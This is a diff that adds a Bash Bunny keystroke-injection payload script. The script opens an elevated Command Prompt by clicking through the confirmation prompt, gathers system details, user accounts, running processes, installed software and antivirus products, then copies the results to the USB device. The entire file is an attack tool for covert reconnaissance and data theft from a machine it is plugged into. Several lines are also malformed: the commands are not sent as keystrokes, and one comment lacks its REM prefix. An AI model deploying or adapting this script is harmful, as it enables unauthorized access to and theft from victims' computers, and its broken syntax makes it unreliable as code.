@@ -1,0 +1,46 @@
+
+REM Set LED to amber
+LED A
+
+REM Open Command Prompt in admin mode
+QUACK GUI r
+DELAY 500
+QUACK STRING cmd
+DELAY 500
+QUACK CTRL-SHIFT ENTER
+DELAY 500
+QUACK TAB
+DELAY 500
+QUACK TAB
+DELAY 500
+QUACK ENTER
+DELAY 500
+
+REM Secure Boot Status
+systeminfo | findstr /C:"Secure Boot" > output.txt
+DELAY 1000
+
+REM SystemInfo
+systeminfo >> output.txt
+DELAY 1000
+
+REM Users
+net user >> output.txt
+DELAY 1000
+
+REM Services Running
+tasklist >> output.txt
+DELAY 1000
+
+Installed Software
+wmic product get name, version >> output.txt
+DELAY 1000
+
+REM Antivirus Installed
+wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /format:value >> output.txt
+
+RUN WIN powershell "Copy-Item -Path 'C:\Windows\System32\output.txt' -Destination ((gwmi win32_volume -f 'label=''BashBunny''').Name + 'payloads\\$SWITCH_POSITION\output.txt')"
+
+
+REM Complete
+LED G
